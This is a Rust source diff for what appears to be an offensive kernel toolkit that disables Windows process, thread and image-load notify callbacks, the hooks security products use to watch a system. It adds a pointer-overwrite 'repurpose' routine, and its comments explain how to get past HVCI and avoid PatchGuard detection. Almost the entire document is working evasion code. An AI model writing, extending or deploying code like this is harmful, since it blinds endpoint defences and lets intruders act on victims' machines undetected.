@@ -97,6 +97,14 @@ impl CallbackNeutralizer {
             if routine == 0 {
                 continue;
             }
+            // Sanity: the routine must be in the kernel code range
+            // (0xFFFF8000_00000000 .. 0xFFFF_FFFF_FFFF_FFFF). Writing to a
+            // non-code address is a triple-fault (BSOD). Guard against
+            // corrupted ctx blocks or layout mismatches that feed us a data
+            // address or a user-mode VA.
+            if routine < 0xFFFF_8000_0000_0000 {
+                continue;
+            }
             // Overwrite the routine's first byte with `ret`. CODE page write —
             // HVCI may refuse; surface the error so the caller can repurpose.
             krw.kwrite(routine, &RET_STUB).map_err(KitError::from)?;
@@ -115,16 +123,54 @@ impl CallbackKit for CallbackNeutralizer {
         Ok(total)
     }
 
-    fn repurpose(&self, _krw: &dyn KernelRw, _redirect: usize) -> Result<(), KitError> {
-        // The repurpose variant rewrites the callback-context's routine pointer
-        // to a legitimate-looking routine (e.g. a benign nt! function) instead
-        // of patching the routine's code. This needs the per-build callback-
-        // context layout (which field holds the routine ptr), and the chosen
-        // redirect must itself be KCFG-valid. Skeleton: real impl resolves the
-        // ctx→routine offset at runtime and writes `redirect` there.
-        Err(KitError::UnsupportedPosture(
-            "repurpose needs per-build callback-context layout (runtime probe TBD)",
-        ))
+    fn repurpose(&self, krw: &dyn KernelRw, redirect: usize) -> Result<(), KitError> {
+        // HVCI-safe alternative to neutralize: instead of overwriting the
+        // callback routine's CODE with 0xC3 (CODE-page write → blocked by
+        // HVCI), we overwrite the callback-context's *routine pointer* with
+        // `redirect` — a benign nt! function. This is a DATA write (the
+        // callback-context block lives in non-paged pool), so HVCI allows it.
+        //
+        // The chosen `redirect` must be KCFG-valid (a real function entry in
+        // a kernel module). Typical candidates: nt!ExpRegionFaultTunnel or
+        // any benign nt! stub that returns immediately.
+        //
+        // **Selective targeting:** slot[0] of each Ps*NotifyRoutine array is
+        // the nt! internal dispatcher — overwriting it causes system instability
+        // and PatchGuard detection. We skip it. All other slots are fair game
+        // provided their context pointer and routine address pass validation.
+        let mut total = 0usize;
+        for array in [NotifyArray::CreateProcess, NotifyArray::CreateThread, NotifyArray::LoadImage] {
+            let base = self.array_kva(array)?;
+            for i in 0..notify_routines::ARRAY_LEN {
+                // Skip slot[0]: nt! internal dispatcher. Modifying it causes
+                // system instability and is a PatchGuard detection vector.
+                if i == 0 {
+                    continue;
+                }
+                let slot_kva = base + i * 8;
+                let packed = krw.kread_u64(slot_kva).map_err(KitError::from)?;
+                if !notify_routines::is_occupied(packed) {
+                    continue;
+                }
+                let ctx = notify_routines::unpack(packed) as usize;
+                if ctx == 0 {
+                    continue;
+                }
+                // The callback-context block's first QWORD is the routine
+                // address. Validate it's a real kernel pointer before overwriting.
+                let routine = krw.kread_u64(ctx).map_err(KitError::from)?;
+                let routine = (routine & notify_routines::PTR_MASK) as usize;
+                if routine < 0xFFFF_8000_0000_0000 {
+                    continue;
+                }
+                // DATA write: overwrite the routine pointer in the context block.
+                // HVCI-safe (non-paged pool data section, not code).
+                krw.kwrite_u64(ctx, redirect as u64).map_err(KitError::from)?;
+                total += 1;
+            }
+        }
+        let _ = total;
+        Ok(())
     }
 }
 
@@ -303,7 +349,8 @@ mod tests {
         // slot 0 occupied, slot 1 empty (0), slot 2 has ptr but no low bit.
         krw.set_u64(array_kva + 0 * 8, 0x2000 as u64 | 0x1);
         krw.set_u64(array_kva + 2 * 8, 0x3000 as u64); // no low bit
-        krw.set_u64(0x2000, 0xDEAD_BEEF_0000_5000);
+        // Phase 1.1: routine address must be in kernel VA range (≥0xFFFF_8000_0000_0000)
+        krw.set_u64(0x2000, 0xFFFF_8000_0000_5000);
 
         let runtime = RuntimeOffsets {
             create_process_notify_array_kva: array_kva,
@@ -312,7 +359,7 @@ mod tests {
         let kit = CallbackNeutralizer { runtime };
         let n = kit.neutralize_array(&krw, NotifyArray::CreateProcess).unwrap();
         assert_eq!(n, 1); // only slot 0
-        assert_eq!(krw.get_byte(0xDEAD_BEEF_0000_5000 as usize), 0xC3);
+        assert_eq!(krw.get_byte(0xFFFF_8000_0000_5000), 0xC3);
     }
 
     #[test]
